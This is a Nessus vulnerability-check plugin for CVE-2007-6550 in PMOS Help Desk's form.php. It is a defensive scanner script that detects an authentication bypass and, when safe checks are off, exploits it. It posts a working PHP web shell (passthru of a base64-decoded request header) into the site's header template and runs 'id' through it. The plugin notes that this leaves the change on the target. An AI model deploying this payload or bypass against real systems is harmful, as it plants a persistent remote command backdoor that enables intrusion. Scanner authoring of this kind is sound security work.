#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29800);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2007-6550");
  script_bugtraq_id(27032);
  script_osvdb_id(42662);
  script_xref(name:"EDB-ID", value:"4789");
  script_xref(name:"Secunia", value:"28201");

  script_name(english:"PMOS Help Desk form.php Arbitrary Code Execution");
  script_summary(english:"Checks for auth bypass issue in PMOS Help Desk"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to an
authentication bypass attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PMOS Help Desk, an open source help desk
application written in PHP. 

The version of PMOS Help Desk installed on the remote host contains a
design flaw that can be leveraged by a remote attacker to bypass
authentication and make changes to the application's form template
settings. 

In addition, since the application passes values from several such
settings to PHP 'eval()' functions, successful exploitation of this
issue can lead to arbitrary command execution on the remote host,
subject to the privileges under which the web server operates." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to h2desk version 2.5 or later as that reportedly 
addresses the issue." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/12/26");
 script_cvs_date("$Date: 2016/05/20 14:30:35 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:pmos_helpdesk:pmos_helpdesk");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pmos", "/helpdesk", "/support", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Check whether the affected script exists.
  url = string(dir, "/form.php");

  r = http_send_recv3(method:"GET",item:url, port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

  # If ...
  if (
    # we see a form to change options and ...
    "following options will make changes" >< res &&
    # we're redirected
    egrep(pattern:"^Location: +browse.php", string:res)
  )
  {
    # Done if safe checks are enabled.
    if (safe_checks())
    {
      report = string(
        "\n",
        "Note that Nessus has verified the form continues execution after the\n",
        "check for credentials failed, but it has not actually tried to exploit\n",
        "this issue because of the 'Safe checks' setting in effect when this scan\n",
        "was run.\n"
      );
      security_hole(port:port, extra:report);
    }
    # Otherwise try to exploit the issue to run a command.
    #
    # nb: this will change the site's header!!!
    else
    {
      # Try to exploit the flaw to modify the header setting.
      fake_srv = string("NESSUS_", toupper(rand_str()));
      exploit = string("<?php error_reporting(0);if($_SERVER[HTTP_", fake_srv, "]){passthru(base64_decode($_SERVER[HTTP_", fake_srv, "]));die;} ?>");

      postdata = string(
        "header=", urlencode(str:exploit)
      );
      r = http_send_recv3(method: "POST", item: url, port: port,
      	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded",
		     fake_srv, base64(str:cmd)),
	data: postdata);
      if (isnull(r)) exit(0);
      res = r[2];

      # Now try to exploit the issue to run a command.
      r = http_send_recv3(method:"GET", item:string(dir, "/"), port:port, 
      	add_headers: make_array(fake_srv, base64(str:cmd)));
      if (isnull(r)) exit(0);
      res = r[2];
      req = http_last_sent_request();

      # Check for a result.
      lines = egrep(pattern:cmd_pat, string:res);
      if (lines)
      {
        if (report_verbosity)
        {
          output = "";
          foreach line (split(lines))
            output += ereg_replace(pattern:'^[ \t]*', replace:"  ", string:line);

          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote host\n",
            "using the following request :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:req),
            "\n",
            "It produced the following output :\n",
            "\n",
            output,
            "\n",
            "Note that you will need to log in as the administrator of the affected\n",
            "application and update the Header Template Option, under 'Manage Ticket\n",
            "Form Template', to prevent further exploitation of this vulnerability.\n"
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
      }
    }
    exit(0);
  }
}
